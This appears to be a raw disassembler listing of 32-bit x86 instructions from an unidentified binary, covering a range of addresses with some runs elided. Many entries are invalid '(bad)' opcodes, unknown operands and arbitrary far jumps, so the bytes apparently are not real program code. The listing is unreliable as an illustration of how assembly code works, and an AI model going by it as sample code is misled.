  42f7b6:	rcl    BYTE PTR [edi+0x3bb5039f],cl
  42f7bc:	mov    edi,0x1f50e42e
  42f7c1:	sub    DWORD PTR [ebx+ecx*4+0x57],ecx
  42f7c5:	jge    0x42f81e
  42f7c7:	sbb    DWORD PTR [ebx+0x19324c70],edx
  42f7cd:	mov    esp,0xd44467d3
  42f7d2:	pop    edx
  42f7d3:	cmp    al,0xa0
  42f7d5:	add    BYTE PTR [edx-0x45],dl
  42f7d8:	loope  0x42f7c1
  42f7da:	jmp    0x64649539
  42f7df:	adc    bl,BYTE PTR [ecx]
  42f7e1:	enter  0x375b,0xb9
  42f7e5:	jmp    0xf338:0x156536cd
  42f7ec:	add    BYTE PTR [ebp+0x0],ch
	...
  42f853:	add    BYTE PTR [eax],al
  42f855:	add    BYTE PTR [ecx-0x5f],dh
  42f858:	(bad)  
  42f859:	test   al,0xd6
  42f85b:	(bad)  
  42f85c:	jg     0x42f857
  42f85e:	push   cs
  42f85f:	pop    ebp
  42f860:	push   ebp
  42f861:	mov    edi,0x43eb0f2a
  42f866:	addr16 std 
  42f868:	add    DWORD PTR [eax],eax
  42f86a:	add    BYTE PTR [ecx],al
  42f86c:	add    BYTE PTR [eax],al
  42f86e:	xor    al,0x23
  42f870:	jecxz  0x42f879
  42f872:	loope  0x42f811
  42f874:	push   edi
  42f875:	lea    eax,[ecx+eiz*4]
  42f878:	loopne 0x42f8dd
  42f87a:	(bad)  
  42f87c:	xor    ah,bl
  42f87e:	leavew 
  42f880:	inc    esp
  42f881:	pop    edx
  42f882:	jl     0x42f8dd
  42f884:	jl     0x42f854
  42f886:	pop    ecx
  42f887:	clc    
  42f888:	sub    eax,0x5a8d057f
  42f88d:	pop    ecx
  42f88e:	add    al,0x67
  42f890:	adc    ch,BYTE PTR [edx-0x44be051a]
  42f896:	jg     0x42f8f6
  42f898:	leave  
  42f899:	and    ch,bh
  42f89b:	imul   ebx,DWORD PTR es:[edi+0x11],0x9
  42f8a0:	in     al,dx
  42f8a1:	lea    edx,[ebp-0x441317ce]
  42f8a7:	xchg   BYTE PTR [esi+0x287521fd],dl
  42f8ad:	(bad)  
  42f8ae:	nop
  42f8af:	and    bh,BYTE PTR [ecx-0x6ca8a2b1]
  42f8b5:	ins    BYTE PTR es:[edi],dx
  42f8b6:	mov    edx,DWORD PTR [eax+eax*2-0x44]
  42f8ba:	add    al,0x26
  42f8bc:	mov    ds:0xcf1d5015,al
  42f8c1:	fcom   DWORD PTR [ecx]
  42f8c3:	xor    DWORD PTR [esp+edi*2],edx
  42f8c6:	sub    BYTE PTR [edi+0x5d],dl
  42f8c9:	sub    bl,BYTE PTR [edi]
  42f8cb:	rcl    DWORD PTR [ecx],1
  42f8cd:	in     al,0xa7
  42f8cf:	dec    ebp
  42f8d0:	jo     0x42f945
  42f8d2:	hlt    
  42f8d3:	test   al,0x49
  42f8d5:	mov    esi,0xbe07f389
  42f8da:	lods   al,BYTE PTR ds:[esi]
  42f8db:	imul   ebx
  42f8dd:	lds    esi,FWORD PTR [edi-0x35]
  42f8e0:	ins    BYTE PTR es:[edi],dx
  42f8e1:	or     DWORD PTR [ebx],0x5d09f85c
  42f8e7:	rol    BYTE PTR [eax+0x5583bf26],1
  42f8ed:	jns    0x42f897
  42f8ef:	popf   
  42f8f0:	xor    BYTE PTR [ebp-0x78],cl
  42f8f3:	es jo  0x42f94a
  42f8f6:	and    eax,0xeb2556c7
  42f8fb:	test   al,0x13
  42f8fd:	icebp  
  42f8fe:	push   0xffffffbb
  42f900:	xor    BYTE PTR [esi+0x53],bl
  42f903:	mov    esi,0xc3802abf
  42f908:	push   ecx
  42f909:	add    bh,BYTE PTR [ecx+edi*8+0x29]
  42f90d:	push   ecx
  42f90e:	pop    eax
  42f90f:	loopne 0x42f8ad
  42f911:	fstp   DWORD PTR [edi]
  42f913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f914:	dec    ecx
  42f915:	mov    eax,ds:0xb235a031
  42f91a:	cmp    BYTE PTR [eax+edx*8-0x339b8389],ah
  42f921:	adc    al,0x35
  42f923:	mov    esp,0x12984856
  42f928:	jg     0x42f8b4
  42f92a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f92b:	daa    
  42f92c:	xor    edi,esp
  42f92e:	dec    esi
  42f92f:	(bad)  
  42f930:	ins    DWORD PTR es:[edi],dx
  42f931:	gs pushf 
  42f933:	out    dx,al
  42f934:	call   0xa9bb:0xa3d9dfe5
  42f93b:	or     edx,0x8079f087
  42f941:	or     eax,0xee068740
  42f946:	popf   
  42f947:	into   
  42f948:	and    al,0xee
  42f94a:	fwait
  42f94b:	sbb    BYTE PTR [eax],0xec
  42f94e:	js     0x42f90e
  42f950:	pop    ss
  42f951:	adc    BYTE PTR [eax-0x5cce7c3c],bh
  42f957:	shl    BYTE PTR ds:0x953e248f,1
  42f95d:	push   edi
  42f95e:	jmp    0x42f936
  42f960:	adc    bl,ch
  42f962:	jno    0x42f9a5
  42f964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f965:	jp     0x42f94d
  42f967:	jg     0x42f9ba
  42f969:	fstp   QWORD PTR [edi-0x59]
  42f96c:	dec    ebx
  42f96d:	rol    BYTE PTR [eax],cl
	...
  42f9d3:	add    BYTE PTR [eax],al
  42f9d5:	add    BYTE PTR [esp+esi*2],dl
  42f9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9d9:	push   ebp
  42f9da:	in     al,0xd5
  42f9dc:	cmc    
  42f9dd:	jne    0x42f98a
  42f9df:	sbb    cl,dh
  42f9e1:	js     0x42f995
  42f9e3:	pop    es
  42f9e4:	loopne 0x42f970
  42f9e6:	inc    BYTE PTR [bx+di]
  42f9e9:	add    BYTE PTR [eax],al
  42f9eb:	add    DWORD PTR [eax],eax
  42f9ed:	add    BYTE PTR [eax-0x32bbd42b],al
  42f9f3:	lods   al,BYTE PTR ds:[esi]
  42f9f4:	mov    ?,ebx
  42f9f6:	shl    BYTE PTR [ebp+0x6b],cl
  42f9f9:	mov    dl,0x45
  42f9fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f9fc:	push   esp
  42f9fd:	jg     0x42f9fb
  42f9ff:	call   esp
  42fa01:	xchg   ebp,eax
  42fa02:	jo     0x42fa69
  42fa04:	(bad)  
  42fa05:	(bad)  
  42fa06:	out    0x2,al
  42fa08:	(bad)  
  42fa09:	outs   dx,DWORD PTR ds:[esi]
  42fa0a:	test   al,0xfa
  42fa0c:	jle    0x42f9a8
  42fa0e:	jl     0x42f9e2
  42fa10:	scas   al,BYTE PTR es:[edi]
  42fa11:	adc    eax,0x925ca34b
  42fa16:	jno    0x42fa4d
  42fa18:	xchg   esp,edi
  42fa1a:	cdq    
  42fa1b:	dec    eax
  42fa1c:	cli    
  42fa1d:	add    eax,0xbebbc62d
  42fa22:	sub    eax,0x7115c98c
  42fa27:	add    ebx,DWORD PTR [ecx+eax*8-0x57]
  42fa2b:	inc    ebp
  42fa2c:	sub    al,0xdb
  42fa2e:	aas    
  42fa2f:	daa    
  42fa30:	and    al,0x6a
  42fa32:	stc    
  42fa33:	xor    al,0x2c
  42fa35:	mov    bh,0xe2
  42fa37:	sbb    BYTE PTR [ecx-0xd],bl
  42fa3a:	push   ds
  42fa3b:	icebp  
  42fa3c:	mov    ebx,0x70123bbc
  42fa41:	jmp    0x42fa37
  42fa43:	popa   
  42fa44:	js     0x42fa09
  42fa46:	imul   ebp,DWORD PTR [eax+0x2],0x366cc00d
  42fa4d:	(bad)  
  42fa4e:	jmp    0x42f9d3
  42fa50:	jmp    0x42fa8f
  42fa52:	adc    al,0x2c
  42fa54:	in     al,0x95
  42fa56:	inc    bp
  42fa58:	sub    esp,edi
  42fa5a:	test   DWORD PTR [edx+0x6cc97392],0xab4f2fdd
  42fa64:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  42fa66:	xchg   ecx,eax
  42fa68:	push   edi
  42fa69:	mov    dh,0xe7
  42fa6b:	cmp    BYTE PTR [edx+0x7985492c],0xf9
  42fa72:	jae    0x42fadb
  42fa74:	xor    BYTE PTR [eax-0x11],0xe0
  42fa78:	pop    edx
  42fa79:	out    dx,eax
  42fa7a:	nop
  42fa7b:	xor    DWORD PTR [ebx-0x21d25f5e],esp
  42fa81:	(bad)  
  42fa82:	xlat   BYTE PTR ds:[ebx]
  42fa83:	adc    DWORD PTR [ebx],esp
  42fa85:	cvtdq2ps xmm4,XMMWORD PTR [ebx+esi*2-0x13]
  42fa8a:	sahf   
  42fa8b:	fisttp WORD PTR [ebx-0x1f6c32dc]
  42fa91:	ret    
  42fa92:	gs out 0x6a,eax
  42fa95:	push   0xffffffba
  42fa97:	mov    ds:0xd616cf77,al
  42fa9c:	loope  0x42fac8
  42fa9e:	dec    edx
  42fa9f:	mov    ds:0xd00dc8df,al
  42faa4:	ret    0x2ee9
  42faa7:	push   esp
  42faa8:	daa    
  42faa9:	nop
  42faaa:	in     eax,dx
  42faab:	ds std 
  42faad:	out    dx,al
  42faae:	shl    DWORD PTR [edx+ecx*2-0xa],1
  42fab2:	clc    
  42fab3:	test   bh,dl
  42fab5:	xchg   esp,eax
  42fab6:	mov    ebx,0xd987985d
  42fabb:	xchg   ah,bl
  42fabd:	xchg   esi,eax
  42fabe:	clc    
  42fabf:	mov    dl,0xea
  42fac1:	cmp    ch,0xec
  42fac4:	outs   dx,DWORD PTR ds:[esi]
  42fac5:	retf   0xf2a6
  42fac8:	pop    eax
  42fac9:	mov    esi,0xb248407d
  42face:	add    eax,0xcb417744
  42fad3:	stos   DWORD PTR es:[edi],eax
  42fad4:	pop    esi
  42fad5:	sbb    DWORD PTR ds:0xf41e7092,ebx
  42fadb:	test   al,0xc4
  42fadd:	repnz (bad)
  42fae0:	fucomip st,st(2)
  42fae2:	adc    bh,BYTE PTR [edx-0x6c228273]
  42fae8:	out    dx,eax
  42fae9:	and    al,0x24
  42faeb:	sbb    esp,edx
  42faed:	add    BYTE PTR es:[eax],al
	...
  42fb54:	add    BYTE PTR [eax],al
  42fb56:	sbb    ebp,edi
  42fb58:	shl    BYTE PTR [esi],0xf4
  42fb5b:	aas    
  42fb5c:	(bad)  
  42fb5d:	out    dx,eax
  42fb5e:	int3   
  42fb5f:	mov    WORD PTR [edi+0x32],?
  42fb62:	clc    
  42fb63:	sbb    BYTE PTR [esi+0x1ff67b5],ch
  42fb69:	add    BYTE PTR [eax],al
  42fb6b:	add    DWORD PTR [eax],eax
  42fb6d:	add    dl,dl
  42fb6f:	aam    0x4b
  42fb71:	imul   eax,DWORD PTR [eax+edx*2+0x2d],0x995b75de
  42fb79:	imul   ebp,DWORD PTR [edi],0x8f659992
  42fb7f:	mov    ebp,0x383b0d9c
  42fb84:	loope  0x42fb3c
  42fb86:	mov    edx,0xbfbc5796
  42fb8b:	(bad)  
  42fb8c:	ficom  WORD PTR [esp+ecx*1-0x3deace40]
  42fb93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb94:	or     eax,0xe30e0a93
  42fb99:	test   BYTE PTR [edx],0xa6
  42fb9c:	xor    cl,al
  42fb9e:	in     eax,0x81
  42fba0:	pop    ebx
  42fba1:	cmp    BYTE PTR [eax+0x6ddcf233],bh
  42fba7:	adc    edi,DWORD PTR [esi-0x6eec06c1]
  42fbad:	adc    BYTE PTR [ebx+0x26],bh
  42fbb0:	xor    esp,DWORD PTR [ecx+eiz*2]
  42fbb3:	icebp  
  42fbb4:	pop    ss
  42fbb5:	imul   esp,DWORD PTR [ebx-0x6f],0xffffffdc
  42fbb9:	xchg   ebp,eax
  42fbba:	xchg   BYTE PTR [eax+0x54],ah
  42fbbd:	ss call 0x989f:0xca5cc83
  42fbc5:	fwait
  42fbc6:	test   eax,0xcd22471f
  42fbcb:	out    dx,eax
  42fbcc:	pushf  
  42fbcd:	or     BYTE PTR [eax],0x8f
  42fbd0:	push   es
  42fbd1:	inc    edx
  42fbd2:	mov    eax,0x5185f054
  42fbd7:	sbb    BYTE PTR [ebx],dl
  42fbd9:	out    0x16,al
  42fbdb:	cwde   
  42fbdc:	test   BYTE PTR [esi],al
  42fbde:	push   ecx
  42fbdf:	loopne 0x42fc23
  42fbe1:	jno    0x42fb9d
  42fbe3:	lods   al,BYTE PTR ds:[esi]
  42fbe4:	and    ch,BYTE PTR [eax-0x60]
  42fbe7:	outs   dx,BYTE PTR ds:[esi]
  42fbe8:	aaa    
  42fbe9:	jbe    0x42fbb8
  42fbeb:	sbb    al,0x72
  42fbed:	popf   
  42fbee:	(bad)  
  42fbef:	std    
  42fbf0:	aad    0x2e
  42fbf2:	pop    ds
  42fbf3:	mov    DWORD PTR [edx+0x60],ecx
  42fbf6:	mov    ah,0x27
  42fbf8:	dec    ebx
  42fbf9:	push   ecx
  42fbfa:	fxch   st(3)
  42fbfc:	lods   al,BYTE PTR ds:[esi]
  42fbfd:	mov    eax,0xb842e949
  42fc02:	lock mov WORD PTR [edx+ebp*1+0x7517ccc2],ss
  42fc0a:	add    cl,BYTE PTR [ebx]
  42fc0c:	leave  
  42fc0d:	pop    ecx
  42fc0e:	xor    al,0x6e
  42fc10:	(bad)  
  42fc11:	outs   dx,BYTE PTR ds:[esi]
  42fc12:	push   ds
  42fc13:	sub    al,0x9d
  42fc15:	sub    eax,DWORD PTR [edi+0x51bf95da]
  42fc1b:	dec    esi
  42fc1c:	data16 (bad) 
  42fc1e:	mov    ecx,?
  42fc20:	test   dl,ch
  42fc22:	sahf   
  42fc23:	ss jnp 0x42fc22
  42fc26:	add    eax,0xe94b8c7a
  42fc2b:	xlat   BYTE PTR ds:[ebx]
  42fc2c:	mov    al,ds:0xe4e8680f
  42fc31:	or     eax,0xc983ecd8
  42fc36:	arpl   WORD PTR [eax-0x3c],di
  42fc39:	shl    DWORD PTR [ebx],0xc1
  42fc3c:	sahf   
  42fc3d:	lods   al,BYTE PTR ds:[esi]
  42fc3e:	mov    al,0x15
  42fc40:	and    DWORD PTR [eax],ebp
  42fc42:	inc    ecx
  42fc43:	fldenv [eax+0x7916b45f]
  42fc49:	ret    
  42fc4a:	pop    esi
  42fc4b:	loope  0x42fcb7
  42fc4d:	or     al,0xbd
  42fc4f:	xor    BYTE PTR [esi+esi*4-0x9],cl
  42fc53:	lods   al,BYTE PTR ds:[esi]
  42fc54:	sub    cl,BYTE PTR [edi+0x64]
  42fc57:	imul   esp
  42fc59:	call   0x633e:0x1940c7af
  42fc60:	mov    edx,DWORD PTR [esi-0x1e]
  42fc63:	imul   ebp,eax,0xae40db68
  42fc69:	fdiv   DWORD PTR [ebx]
  42fc6b:	sar    cl,0x44
	...
  42fcd6:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fcdc:	mov    ebx,0x36325e9a
  42fce1:	and    BYTE PTR [ecx-0x10],ah
  42fce4:	add    esp,DWORD PTR [eax+0x67]
  42fce7:	add    BYTE PTR [edx],al
  42fce9:	add    BYTE PTR [eax],al
  42fceb:	add    DWORD PTR [eax],eax
  42fced:	add    cl,dh
  42fcef:	ins    BYTE PTR es:[edi],dx
  42fcf0:	data16 fisub DWORD PTR [esp+eiz*4]
  42fcf4:	into   
  42fcf5:	push   ecx
  42fcf6:	and    esp,DWORD PTR [edx]
  42fcf8:	mov    dl,0x42
  42fcfa:	pop    esi
  42fcfb:	pop    edx
  42fcfc:	(bad)  
  42fcfd:	mov    cl,0xbe
  42fcff:	xor    DWORD PTR [esp+edi*4],eax
  42fd02:	push   0xffffffe9
  42fd04:	sbb    dl,BYTE PTR [edi-0x5f5f0ea2]
  42fd0a:	bnd ja 0x42fd32
  42fd0d:	shr    BYTE PTR [edx],cl
  42fd0f:	or     eax,0x2359cd02
  42fd14:	cmp    BYTE PTR [esi+0x74a74b33],dh
  42fd1a:	and    BYTE PTR [ebp+0x3b0de10a],cl
  42fd20:	add    bh,BYTE PTR [ecx-0x2447f410]
  42fd26:	jbe    0x42fd45
  42fd28:	ja     0x42fce0
  42fd2a:	out    0x42,al
  42fd2c:	loope  0x42fce9
  42fd2e:	mov    ?,WORD PTR [edx-0x77]
  42fd31:	sub    edx,DWORD PTR [ebp+0x52]
  42fd34:	or     bh,BYTE PTR [ecx+0x6d]
  42fd37:	sub    BYTE PTR [edx],cl
  42fd39:	and    dh,BYTE PTR [ebp+0x7]
  42fd3c:	dec    ebp
  42fd3d:	dec    ebx
  42fd3e:	and    dh,ch
  42fd40:	fcom   QWORD PTR [ecx+ecx*4]
  42fd43:	xchg   esp,eax
  42fd44:	push   ss
  42fd45:	dec    esi
  42fd46:	outs   dx,BYTE PTR ds:[esi]
  42fd47:	shl    BYTE PTR [ebx-0x3d],1
  42fd4a:	sub    al,0x3c
  42fd4c:	inc    ebx
  42fd4d:	jo     0x42fd50
  42fd4f:	ins    DWORD PTR es:[edi],dx
  42fd50:	outs   dx,DWORD PTR ds:[esi]
  42fd51:	les    ebx,FWORD PTR [edi+0x5]
  42fd54:	es pop dx
  42fd57:	shufps xmm1,XMMWORD PTR [ecx-0x6135d93b],0xca
  42fd5f:	shr    DWORD PTR [edx],cl
  42fd61:	pop    ecx
  42fd62:	xor    ah,BYTE PTR [eax+0x30]
  42fd65:	dec    ecx
  42fd66:	fnstsw WORD PTR [ebx]
  42fd68:	fld    DWORD PTR [eax]
  42fd6a:	cmp    BYTE PTR [esp+eiz*2-0x2b],dl
  42fd6e:	cmp    ah,BYTE PTR ds:0xf9ded861
  42fd74:	pop    es
  42fd75:	push   ecx
  42fd76:	mov    ah,0x98
  42fd78:	sub    DWORD PTR [ebp-0xf6242d6],0xffffffb8
  42fd7f:	adc    eax,0x1efbb645
  42fd84:	and    al,0xf9
  42fd86:	mov    bh,0xcc
  42fd88:	or     dl,BYTE PTR [edi-0x55dabdf0]
  42fd8e:	ret    0xe59e
  42fd91:	test   BYTE PTR [ebx],dl
  42fd93:	xor    ch,bh
  42fd95:	sub    eax,0x4b35c486
  42fd9a:	cmc    
  42fd9b:	add    BYTE PTR [edx+0x7539823f],bh
  42fda1:	pop    esi
  42fda2:	jbe    0x42fd84
  42fda4:	push   ds
  42fda5:	cdq    
  42fda6:	in     eax,0x58
  42fda8:	div    BYTE PTR [esi-0x75853b1b]
  42fdae:	std    
  42fdaf:	or     DWORD PTR [edx+eax*4+0x42],edi
  42fdb3:	icebp  
  42fdb4:	dec    edx
  42fdb5:	dec    esi
  42fdb6:	repz int3 
  42fdb8:	test   al,0xc6
  42fdba:	cli    
  42fdbb:	int    0x34
  42fdbd:	inc    ebp
  42fdbe:	ret    
  42fdbf:	lahf   
  42fdc0:	xlat   BYTE PTR ds:[ebx]
  42fdc1:	mov    edx,0x2964d598
  42fdc6:	mov    al,ds:0xb311ba6f
  42fdcb:	mov    WORD PTR [ebx+0x76],?
  42fdce:	dec    edi
  42fdcf:	imul   DWORD PTR [eax-0x62]
  42fdd2:	push   eax
  42fdd3:	call   0x2628:0x6705b03a
  42fdda:	add    ch,BYTE PTR [ebp+0x25b3ab7e]
  42fde0:	dec    ecx
  42fde1:	inc    ebp
  42fde2:	jmp    0xcb9:0x5f0307ee
  42fde9:	add    ch,BYTE PTR [esi]
  42fdeb:	xchg   esi,eax
  42fdec:	jecxz  0x42fe6b
	...
  42fe56:	dec    eax
  42fe57:	rol    dl,0xf0
  42fe5a:	retf   0x7af2
  42fe5d:	clc    
  42fe5e:	cmc    
  42fe5f:	inc    edx
  42fe60:	stos   BYTE PTR es:[edi],al
  42fe61:	repz out dx,eax
  42fe63:	xor    al,0xc
  42fe65:	add    ah,BYTE PTR [edi+0x1]
  42fe68:	add    al,BYTE PTR [eax]
  42fe6a:	add    BYTE PTR [ecx],al
  42fe6c:	add    BYTE PTR [eax],al
  42fe6e:	mov    BYTE PTR [ebx+edx*2+0x74],cl
  42fe72:	sbb    bl,bl
  42fe74:	adc    BYTE PTR [eax],dl
  42fe76:	gs push ebp
  42fe78:	outs   dx,DWORD PTR ds:[esi]
  42fe79:	push   esp
  42fe7a:	adc    eax,0xf806895e
  42fe7f:	mov    esp,0xded455ae
  42fe84:	fst    DWORD PTR [ecx+ebp*1-0x18]
  42fe88:	push   esp
  42fe89:	jnp    0x42ff0a
  42fe8b:	cs iret 
  42fe8d:	jns    0x42fe60
  42fe8f:	lock add al,0x2
  42fe92:	mov    eax,0x26efa4bc
  42fe97:	and    esi,DWORD PTR [ecx]
  42fe99:	loopne 0x42fe8e
  42fe9b:	imul   edi,DWORD PTR [edi],0xffffffb5
  42fe9e:	imul   eax,eax,0xb957f0c8
  42fea4:	pcmpgtd mm3,QWORD PTR [edi]
  42fea7:	das    
  42fea8:	sub    al,0xd3
  42feaa:	cmp    BYTE PTR [edi+eax*1],0x9c
  42feae:	sub    bl,al
  42feb0:	cld    
  42feb1:	pop    ds
  42feb2:	add    bl,ah
  42feb4:	lock dec ebx
  42feb6:	dec    edi
  42feb8:	mov    BYTE PTR [esi+eax*8+0x487b94c1],dh
  42febf:	ins    BYTE PTR es:[edi],dx
  42fec0:	adc    BYTE PTR [ecx],cl
  42fec2:	or     DWORD PTR [ebp+0x72f41021],ebp
  42fec8:	mov    edi,0x166129bb
  42fecd:	mov    esp,0xe4204d8e
  42fed2:	mov    eax,ds:0xcfba32ab
  42fed7:	xor    DWORD PTR [ebp-0x7e],0xffffff8d
  42fedb:	dec    edi
  42fedc:	push   es
  42fedd:	xchg   esi,eax
  42fede:	mov    edx,0xd5832c12
  42fee3:	fs retf 
  42fee5:	je     0x42ff65
  42fee7:	dec    ebp
  42fee8:	jne    0x42fea4
  42feea:	fbstp  TBYTE PTR [ecx-0x66349590]
  42fef0:	mov    edi,0x909c0cfa
  42fef5:	mov    eax,0x79573d7
  42fefa:	pop    ds
  42fefb:	mov    eax,0x569e0917
  42ff00:	or     eax,0xe5a83b4a
  42ff05:	jns    0x42ff1c
  42ff07:	(bad)  
  42ff08:	pop    edx
  42ff09:	or     al,0x35
  42ff0b:	mov    cl,0xfe
  42ff0d:	mov    ch,0x37
  42ff0f:	repnz clc 
  42ff11:	push   es
  42ff12:	lds    eax,FWORD PTR es:[ecx]
  42ff15:	mov    ah,0x9
  42ff17:	add    eax,0x90d54440
  42ff1c:	dec    esp
  42ff1d:	jp     0x42ff21
  42ff1f:	repz pop eax
  42ff21:	les    ecx,FWORD PTR [edx+ecx*1-0x5c]
  42ff25:	xor    ebp,esp
  42ff27:	and    esp,edi
  42ff29:	add    al,0x39
  42ff2b:	sbb    eax,0xedcd21a4
  42ff30:	xchg   ecx,eax
  42ff31:	leave  
  42ff32:	out    0x34,eax
  42ff34:	cmp    bl,BYTE PTR [ecx-0x22457a01]
  42ff3a:	push   es
  42ff3b:	sbb    eax,0x476feaa5
  42ff40:	or     eax,DWORD PTR ds:0x17bea2fd
  42ff46:	xchg   BYTE PTR [ebx-0x7e70a9e5],dl
  42ff4c:	lea    esi,[eax-0x4263a047]
  42ff52:	repz (bad) 
  42ff54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ff55:	jl     0x42ff90
  42ff57:	jle    0x42feda
  42ff59:	mov    al,BYTE PTR [ebp-0x53e9573b]
  42ff5f:	pop    es
  42ff60:	mov    eax,0xb89cdbf8
  42ff65:	clc    
  42ff66:	(bad)  
  42ff67:	sbb    bh,ch
  42ff69:	iret   
  42ff6a:	or     BYTE PTR [eax+0xe266],al
	...
  42ffd4:	add    BYTE PTR [eax],al
  42ffd6:	add    al,0x67
  42ffd8:	std    
  42ffd9:	aaa    
  42ffda:	(bad)  
  42ffdb:	mov    edi,0x9ffa77ce
  42ffe0:	shl    DWORD PTR [eax+esi*1+0x6e],0xbb
  42ffe5:	or     esp,DWORD PTR [edi+0x2]
  42ffe8:	add    al,BYTE PTR [eax]
  42ffea:	add    BYTE PTR [ecx],al
  42ffec:	add    BYTE PTR [eax],al
  42ffee:	dec    eax
  42ffef:	push   0x5e26ac47
  42fff4:	jg     0x430060
  42fff6:	mov    cl,0xed
  42fff8:	push   ds
  42fff9:	adc    BYTE PTR [edx],0xbc
  42fffc:	xor    DWORD PTR [ebp+edx*2+0x70],esp
  430000:	cwde   
  430001:	dec    edx
  430002:	ja     0x43005b
  430004:	dec    edx
  430005:	mov    ebx,0x2214fae3
  43000a:	or     ebx,edx
  43000c:	or     al,BYTE PTR [eax]
  43000e:	sahf   
  43000f:	cmp    BYTE PTR [ebp+0x6e462534],0x35
  430016:	mov    dh,0x26
  430018:	sub    eax,0x72c03ed6
  43001d:	(bad)  [esi-0x3cb81abf]
  430023:	jmp    0x5065b047
  430028:	xor    al,0xd1
  43002a:	fstp   TBYTE PTR [edi-0x2280b49a]
  430030:	cmp    cl,BYTE PTR [edx+ecx*1+0x1]
  430034:	mov    esi,0x39998ca2
  430039:	mov    cl,0xc8
  43003b:	mov    BYTE PTR [ebx],al
  43003d:	jno    0x430023
  43003f:	xor    al,0xe3
  430041:	mov    eax,ds:0xe87eea36
  430046:	pop    ds
  430047:	sahf   
  430048:	add    BYTE PTR ds:0xb6b55d18,ah
  43004e:	jle    0x430046
  430050:	lea    esp,[ebp+0x1bde0a55]
  430056:	aad    0x54
  430058:	jp     0x430059
  43005a:	jg     0x430075
  43005c:	rol    DWORD PTR ss:[ebp-0xc2a2c43],cl
  430063:	stos   BYTE PTR es:[edi],al
  430064:	sub    eax,0x1afd1e38
  430069:	and    bl,BYTE PTR ss:[edx]
  43006c:	jae    0x4300dd
  43006e:	pusha  
  43006f:	cmp    ebx,eax
  430071:	popa   
  430072:	inc    esp
  430073:	sub    cl,ah
  430075:	call   0x47f2:0x8a89abfb
  43007c:	out    dx,eax
  43007d:	pop    edx
  43007e:	xor    BYTE PTR [edi+ecx*2],al
  430081:	jecxz  0x4300de
  430083:	popf   
  430084:	mov    al,0x10
  430086:	cmp    dl,BYTE PTR [esi-0x11]
  430089:	test   al,0x5
  43008b:	push   es
  43008c:	cmp    al,0x74
  43008e:	pop    ds
  43008f:	arpl   WORD PTR [ecx],di
  430091:	push   edi
  430092:	clc    
  430093:	sti    
  430094:	xor    ah,BYTE PTR [edx+eiz*4]
  430097:	or     BYTE PTR [ecx],dl
  430099:	mov    bh,0x81
  43009b:	and    ebx,DWORD PTR [esp+eiz*4]
  43009e:	mov    cl,0xb8
  4300a0:	dec    edi
  4300a1:	push   es
  4300a2:	pop    ecx
  4300a3:	jne    0x430026
  4300a5:	jnp    0x430117
  4300a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4300a8:	cmp    al,0xf3
  4300aa:	mov    dh,BYTE PTR [esi+0x4e460598]
  4300b0:	sub    DWORD PTR [eax],edx
  4300b2:	arpl   WORD PTR [ebx+0x5899e05d],sp
  4300b8:	sti    
  4300b9:	cmp    BYTE PTR [edx+0x25],ch
  4300bc:	jecxz  0x4300eb
  4300be:	pop    ss
  4300bf:	fdiv   DWORD PTR [esp+edi*1]
  4300c2:	mov    cl,BYTE PTR fs:[ebp-0x79afb079]
  4300c9:	push   ss
  4300ca:	xlat   BYTE PTR ds:[ebx]
  4300cb:	adc    BYTE PTR [edi],0x99
  4300ce:	mov    bh,0x58
  4300d0:	ins    BYTE PTR es:[edi],dx
  4300d1:	mov    ebx,0x81c5c183
  4300d6:	jmp    0x6e7a:0x4298db8
  4300dd:	in     al,dx
  4300de:	out    0x45,eax
  4300e0:	pusha  
  4300e1:	scas   al,BYTE PTR es:[edi]
  4300e2:	and    ah,BYTE PTR [eax+esi*1+0x682bf7b0]
  4300e9:	dec    esi
  4300ea:	pop    ebx
  4300eb:	ins    BYTE PTR es:[edi],dx
  4300ec:	and    DWORD PTR [ebx+0x0],ebp
	...
  430156:	(bad)  
  430157:	ins    DWORD PTR es:[edi],dx
  430158:	aam    0xb5
  43015a:	(bad)  
  43015b:	mov    ebp,0x9547fe7
  430160:	scas   eax,DWORD PTR es:[edi]
  430161:	add    al,0xc5
  430163:	test   al,0x31
  430165:	das    
  430166:	add    eax,DWORD PTR [bp+si]
  430169:	add    BYTE PTR [eax+eax*1],ch
  43016c:	add    BYTE PTR [eax],al
  43016e:	les    eax,FWORD PTR ds:0x17153a57
  430174:	fsubr  QWORD PTR [ecx]
  430176:	add    DWORD PTR [ebx+0x1fa6a0f1],ebp
  43017c:	cmp    al,0x12
  43017e:	(bad)  
  43017f:	xor    eax,ebx
  430181:	unpcklps xmm3,XMMWORD PTR [esi-0x267095ca]
  430188:	outs   dx,BYTE PTR ds:[esi]
  430189:	dec    ebx
  43018a:	sbb    al,BYTE PTR [ebx]
  43018c:	pop    edi
  43018d:	call   0x2eee:0x7e4cb902
  430194:	pop    eax
  430195:	adc    eax,0x2d7c7606
	...
  4301d6:	dec    ebp
  4301d7:	push   ebp
  4301d8:	mov    DWORD PTR [ebx-0x7e9e13f8],ecx
  4301de:	mov    esp,ebp
  4301e0:	or     al,ah
  4301e2:	dec    ebp
  4301e3:	add    bh,al
  4301e5:	add    BYTE PTR [eax],cl
  4301e7:	add    BYTE PTR [eax],al
  4301e9:	mov    DWORD PTR [eax],0x3ff44545
  4301ef:	xor    DWORD PTR [eax],eax
  4301f1:	test   DWORD PTR [ebx-0x34070b64],ecx
  4301f7:	(bad)  
  4301f8:	enter  0x4d45,0xb8
  4301fc:	mov    esi,DWORD PTR [edx]
  4301fe:	hlt    
  4301ff:	test   ebx,ecx
  430201:	pushf  
  430202:	enter  0x4df8,0x8b
  430206:	mov    DWORD PTR [ebp+0x8],0x894708
  43020d:	inc    ebp
  43020e:	mov    ebp,0xff8bfffc
  430213:	dec    ebp
  430214:	mov    ch,0xf4
  430216:	call   DWORD PTR [ebx-0x1]
  430219:	mov    ebx,0x8005426
  43021e:	call   DWORD PTR [ecx+0x8]
  430221:	pop    es
  430222:	jmp    0xb8:0x9cb4533
